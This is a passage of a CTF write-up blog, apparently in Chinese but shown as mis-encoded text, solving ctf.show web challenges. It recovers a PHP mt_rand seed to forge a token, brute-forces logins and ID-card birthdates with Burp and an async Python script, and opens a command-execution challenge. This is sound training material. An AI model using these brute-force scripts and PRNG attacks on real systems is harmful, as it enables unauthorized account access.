</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">mt_srand</span><span class="p">(</span><span class="nx">hexdec</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">)));</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$rand</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">-</span><span class="nx">intval</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">());</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">if</span><span class="p">((</span><span class="o">!</span><span class="nv">$rand</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span><span class="o">==</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">()</span><span class="o">+</span><span class="nx">mt_rand</span><span class="p">())){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nv">$rand</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;cat /proc/version&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ç»§ç»­phpä¼ªéšæœºæ•°</p>
<p>æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªæ€§è´¨</p>
<p>å½“mt_srand()ä¸­çš„ç§å­æ˜¯å›ºå®šçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”Ÿæˆçš„éšæœºæ•°çš„åºåˆ—å°±æ˜¯ç›¸åŒçš„ï¼Œå¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">1852100618</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s1">&#39;&#39;</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="mi">1640856123</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="mi">1390302953</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="mi">893879251</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="mi">859994814</span>
</span></span></code></pre></div><p>åœ¨è¿™é“é¢˜é‡Œé¢æˆ‘ä»¬éœ€è¦å¾—åˆ°å‰ä¸‰ä¸ªéšæœºæ•°</p>
<p>ç¬¬ä¸€ä¸ªéšæœºæ•°æˆ‘ä»¬å¯ä»¥ä½¿r=0å¾—åˆ°ï¼Œç¬¬ä¸€ä¸ªéšæœºæ•°ä¸º1640856123</p>
<p><img alt="image-20241124162638637" loading="lazy" src="assets/image-20241124162638637.png"></p>
<p>å¾—åˆ°ç¬¬ä¸€ä¸ªéšæœºæ•°ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼å¾—åˆ°ç§å­ï¼Œä»è€Œå¾—åˆ°ç¬¬äºŒï¼Œç¬¬ä¸‰ä¸ªéšæœºæ•°</p>
<p>phpè„šæœ¬(æå…¶æ…¢)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$a</span><span class="o">=</span> <span class="mi">390148868</span><span class="p">;</span><span class="c1">//ç¬¬ä¸€ä¸ªéšæœºæ•°
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"></span><span class="nv">$b</span><span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">()</span><span class="o">==</span><span class="nv">$a</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;success:&#34;</span><span class="o">+</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nv">$b</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>æˆ–è€…ä½¿ç”¨php_mt_seed-4.0å·¥å…·</p>
<p><img alt="image-20241124163359970" loading="lazy" src="assets/image-20241124163359970.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸åŒç‰ˆæœ¬çš„seedæ˜¯ä¸åŒçš„ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªè¯•è¯•å°±è¡Œäº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">1852100618</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span><span class="c1">// ç¬¬ä¸€æ¬¡éšæœºæ•°ï¼ˆä¸èƒ½å°‘ï¼‰
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">tokenï¼š&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nx">mt_rand</span><span class="p">()</span><span class="o">+</span><span class="nx">mt_rand</span><span class="p">());</span> <span class="c1">//ç¬¬äºŒå’Œç¬¬ä¸‰æ¬¡éšæœºæ•°ç›¸åŠ ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦å¯¹token
</span></span></span></code></pre></div><p>å¾—åˆ°tokençš„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿randä¸ºé›¶å³å¯å¾—åˆ°flag</p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ä½¿rç­‰äºç¬¬ä¸€æ¬¡éšæœºæ•°å³å¯</p>
<p>ä¼ å‚ï¼Œå¾—åˆ°flag</p>
<p><img alt="image-20241124163754599" loading="lazy" src="assets/image-20241124163754599.png"></p>
<h4 id="web26">web26<a hidden class="anchor" aria-hidden="true" href="#web26">#</a></h4>
<p><img alt="image-20241124173300016" loading="lazy" src="assets/image-20241124173300016.png"></p>
<p>è¿™ä¹ˆå¤šæˆ‘å’‹çˆ†ï¼ŒèµŒä¸€æŠŠåªçˆ†å¯†ç </p>
<p><img alt="image-20241124173340723" loading="lazy" src="assets/image-20241124173340723.png"></p>
<h4 id="web27">web27<a hidden class="anchor" aria-hidden="true" href="#web27">#</a></h4>
<p><img alt="image-20241124201909506" loading="lazy" src="assets/image-20241124201909506.png"></p>
<p>è¿™é¢˜æ˜¯ä¸€ä¸ªæ•™åŠ¡ç³»ç»Ÿï¼Œéœ€è¦é€šè¿‡è´¦å·å¯†ç ç™»å½•</p>
<p>å…ˆä¿¡æ¯æ”¶é›†ä¸€ä¸‹</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è´¦å·å¯†ç ä¸‹é¢æœ‰ä¸€ä¸ªå½•å–åå•å’Œå­¦ç”Ÿå­¦ç±ä¿¡æ¯æŸ¥è¯¢ç³»ç»Ÿ</p>
<p><img alt="image-20241124202141536" loading="lazy" src="assets/image-20241124202141536.png"></p>
<p><img alt="image-20241124202155511" loading="lazy" src="assets/image-20241124202155511.png"></p>
<p>åˆ†åˆ«å¦‚ä¸Šï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡çˆ†ç ´å­¦ç”Ÿçš„èº«ä»½è¯ä¿¡æ¯ä»è€Œé€šè¿‡å½•å–æŸ¥è¯¢æŸ¥åˆ°å­¦ç”Ÿçš„ä¿¡æ¯å‘¢ï¼Ÿ</p>
<p>bpæŠ“ä¸ªåŒ…</p>
<p><img alt="image-20241124203316274" loading="lazy" src="assets/image-20241124203316274.png"></p>
<p>å“æˆ‘è‰ï¼Œæˆ‘æ•°æ®å‘¢</p>
<p>forwardä¸€ä¸‹ï¼ˆæ˜¯å› ä¸ºæ•°æ®å®é™…ä¸Šåœ¨checkdb.phpæ‰æäº¤å—ï¼Ÿä¸æ˜¯å¾ˆæ‡‚ï¼‰</p>
<p><img alt="image-20241124203440000" loading="lazy" src="assets/image-20241124203440000.png"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å®èº«ä»½è¯ç¼ºå¤±çš„éƒ¨åˆ†åˆšå¥½æ˜¯å‡ºç”Ÿæ—¥æœŸ</p>
<p>é‚£æˆ‘ä»¬å¯ä»¥ç”¨bpä¸­çš„æ—¥æœŸçˆ†ç ´åŠŸèƒ½</p>
<p><img alt="image-20241124205446714" loading="lazy" src="assets/image-20241124205446714.png"></p>
<p><img alt="image-20241124211229000" loading="lazy" src="assets/image-20241124211229000.png"></p>
<p>çˆ†å‡ºæ¥çš„msgç”¨unicodeè§£ç ä¸€ä¸‹å°±èƒ½å¾—åˆ°è´¦å·å¯†ç äº†</p>
<p><img alt="image-20241124211334906" loading="lazy" src="assets/image-20241124211334906.png"></p>
<p>è´´ä¸ªå¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php&#39;</span> <span class="n">NUM</span><span class="o">=</span><span class="mi">32</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">def</span> <span class="nf">run_tasks</span><span class="p">(</span><span class="n">L</span><span class="p">):</span> <span class="n">U</span><span class="o">=</span><span class="p">[]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">L</span><span class="p">:</span> <span class="n">U</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">asyncio</span><span class="o">.</span><span class="n">ensure_future</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="n">loop</span> <span class="o">=</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span> <span class="n">loop</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">asyncio</span><span class="o">.</span><span class="n">wait</span><span class="p">(</span><span class="n">U</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">class</span> <span class="nc">TaskRuner</span><span class="p">:</span> <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">n</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="o">=</span><span class="p">[]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">task_function</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="bp">self</span><span class="o">.</span><span class="n">task_num</span><span class="o">=</span><span class="n">n</span> <span class="k">async</span> <span class="k">def</span> <span class="nf">task_function</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">n</span><span class="p">):</span> <span class="k">pass</span> <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="n">run_tasks</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">on_over</span><span class="p">()</span> <span class="k">def</span> <span class="nf">on_over</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="k">pass</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">aiohttp</span> <span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span> <span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span><span class="p">,</span> <span class="n">timedelta</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">class</span> <span class="nc">NYR</span><span class="p">:</span> <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">start_date</span><span class="p">,</span><span class="n">end_date</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">start_date</span><span class="o">=</span><span class="n">start_date</span> <span class="bp">self</span><span class="o">.</span><span class="n">end_date</span><span class="o">=</span><span class="n">end_date</span> <span class="bp">self</span><span class="o">.</span><span class="n">delta</span> <span class="o">=</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_date</span> <span class="o">=</span> <span class="n">start_date</span> <span class="k">def</span> <span class="nf">next</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="n">t</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">current_date</span> <span class="k">if</span> <span class="n">t</span><span class="o">&gt;</span><span class="bp">self</span><span class="o">.</span><span class="n">end_date</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_date</span><span class="o">+=</span><span class="bp">self</span><span class="o">.</span><span class="n">delta</span> <span class="k">return</span> <span class="n">t</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">class</span> <span class="nc">Scanner</span><span class="p">(</span><span class="n">TaskRuner</span><span class="p">):</span> <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">d1</span><span class="p">,</span><span class="n">d2</span><span class="p">,</span><span class="n">n</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">nyr</span><span class="o">=</span><span class="n">NYR</span><span class="p">(</span><span class="n">d1</span><span class="p">,</span><span class="n">d2</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">alive</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">task_function</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">alive</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">u</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">nyr</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">u</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">alive</span><span class="o">=</span><span class="kc">False</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">t</span><span class="p">:</span><span class="n">date</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php&#39;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="n">n</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">year</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="n">y</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">month</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">day</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="n">n</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="n">y</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="n">y</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="n">y</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="n">r</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="n">sfz</span><span class="o">=</span><span class="s1">&#39;621022&#39;</span><span class="o">+</span><span class="n">n</span><span class="o">+</span><span class="n">y</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="s1">&#39;5237&#39;</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="s1">&#39;a&#39;</span><span class="p">:</span><span class="s1">&#39;é«˜å…ˆä¼Š&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="s1">&#39;p&#39;</span><span class="p">:</span><span class="n">sfz</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="n">sess</span><span class="o">=</span><span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="k">await</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">ssl</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="n">text</span><span class="o">=</span><span class="k">await</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">js</span><span class="o">=</span><span class="n">loads</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="n">msg</span><span class="o">=</span><span class="n">js</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sfz</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">await</span> <span class="n">sess</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">return</span> <span class="n">msg</span><span class="o">!=</span><span class="s1">&#39;æäº¤ä¿¡æ¯æœ‰è¯¯&#39;</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="k">await</span> <span class="n">sess</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">
</span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">handle_up</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">u</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">Scanner</span><span class="p">(</span><span class="n">date</span><span class="p">(</span><span class="mi">1990</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="n">date</span><span class="p">(</span><span class="mi">2010</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">12</span><span class="p">),</span><span class="n">NUM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="n">a</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="web28">web28<a hidden class="anchor" aria-hidden="true" href="#web28">#</a></h4>
<p><img alt="image-20241124212238261" loading="lazy" src="assets/image-20241124212238261.png"></p>
<p>è¿™é¢˜æœ¬æ¥ä¸çŸ¥é“è¦å¹²å˜›</p>
<p><img alt="image-20241124212302234" loading="lazy" src="assets/image-20241124212302234.png"></p>
<p>dirsearchæ‰«ä¸€ä¸‹,æ„Ÿè§‰åº”è¯¥æ˜¯ç›®å½•çˆ†ç ´</p>
<p><img alt="image-20241124213646757" loading="lazy" src="assets/image-20241124213646757.png"></p>
<p>å…ˆçˆ†ç ´ä¸€ä¸‹0-100</p>
<p><img alt="image-20241124220027195" loading="lazy" src="assets/image-20241124220027195.png"></p>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼š<a hidden class="anchor" aria-hidden="true" href="#å‘½ä»¤æ‰§è¡Œ">#</a></h3>
<h4 id="web29">web29<a hidden class="anchor" aria-hidden="true" href="#web29">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:26:48
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
